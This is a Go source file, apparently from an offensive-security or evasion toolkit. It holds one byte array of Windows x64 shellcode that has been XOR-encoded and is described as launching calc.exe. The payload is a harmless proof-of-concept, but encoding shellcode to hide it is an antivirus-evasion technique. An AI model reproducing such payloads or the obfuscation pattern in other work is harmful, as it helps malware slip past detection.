package utils

// EncBuf is an example variable containing a Windows x64 ShellCode Payload encoded with
// utils.Xor that executes calc.exe
var EncBuf = []byte{
	0xcf, 0x7b, 0xb0, 0xd7, 0xc3, 0xdb, 0xf3, 0x33, 0x33, 0x33, 0x72, 0x62, 0x72, 0x63, 0x61,
	0x62, 0x65, 0x7b, 0x02, 0xe1, 0x56, 0x7b, 0xb8, 0x61, 0x53, 0x7b, 0xb8, 0x61, 0x2b, 0x7b,
	0xb8, 0x61, 0x13, 0x7b, 0xb8, 0x41, 0x63, 0x7b, 0x3c, 0x84, 0x79, 0x79, 0x7e, 0x02, 0xfa,
	0x7b, 0x02, 0xf3, 0x9f, 0x0f, 0x52, 0x4f, 0x31, 0x1f, 0x13, 0x72, 0xf2, 0xfa, 0x3e, 0x72,
	0x32, 0xf2, 0xd1, 0xde, 0x61, 0x72, 0x62, 0x7b, 0xb8, 0x61, 0x13, 0xb8, 0x71, 0x0f, 0x7b,
	0x32, 0xe3, 0xb8, 0xb3, 0xbb, 0x33, 0x33, 0x33, 0x7b, 0xb6, 0xf3, 0x47, 0x54, 0x7b, 0x32,
	0xe3, 0x63, 0xb8, 0x7b, 0x2b, 0x77, 0xb8, 0x73, 0x13, 0x7a, 0x32, 0xe3, 0xd0, 0x65, 0x7b,
	0xcc, 0xfa, 0x72, 0xb8, 0x07, 0xbb, 0x7b, 0x32, 0xe5, 0x7e, 0x02, 0xfa, 0x7b, 0x02, 0xf3,
	0x9f, 0x72, 0xf2, 0xfa, 0x3e, 0x72, 0x32, 0xf2, 0x0b, 0xd3, 0x46, 0xc2, 0x7f, 0x30, 0x7f,
	0x17, 0x3b, 0x76, 0x0a, 0xe2, 0x46, 0xeb, 0x6b, 0x77, 0xb8, 0x73, 0x17, 0x7a, 0x32, 0xe3,
	0x55, 0x72, 0xb8, 0x3f, 0x7b, 0x77, 0xb8, 0x73, 0x2f, 0x7a, 0x32, 0xe3, 0x72, 0xb8, 0x37,
	0xbb, 0x7b, 0x32, 0xe3, 0x72, 0x6b, 0x72, 0x6b, 0x6d, 0x6a, 0x69, 0x72, 0x6b, 0x72, 0x6a,
	0x72, 0x69, 0x7b, 0xb0, 0xdf, 0x13, 0x72, 0x61, 0xcc, 0xd3, 0x6b, 0x72, 0x6a, 0x69, 0x7b,
	0xb8, 0x21, 0xda, 0x64, 0xcc, 0xcc, 0xcc, 0x6e, 0x7b, 0x89, 0x32, 0x33, 0x33, 0x33, 0x33,
	0x33, 0x33, 0x33, 0x7b, 0xbe, 0xbe, 0x32, 0x32, 0x33, 0x33, 0x72, 0x89, 0x02, 0xb8, 0x5c,
	0xb4, 0xcc, 0xe6, 0x88, 0xc3, 0x86, 0x91, 0x65, 0x72, 0x89, 0x95, 0xa6, 0x8e, 0xae, 0xcc,
	0xe6, 0x7b, 0xb0, 0xf7, 0x1b, 0x0f, 0x35, 0x4f, 0x39, 0xb3, 0xc8, 0xd3, 0x46, 0x36, 0x88,
	0x74, 0x20, 0x41, 0x5c, 0x59, 0x33, 0x6a, 0x72, 0xba, 0xe9, 0xcc, 0xe6, 0x50, 0x52, 0x5f,
	0x50, 0x1d, 0x56, 0x4b, 0x56, 0x33,
}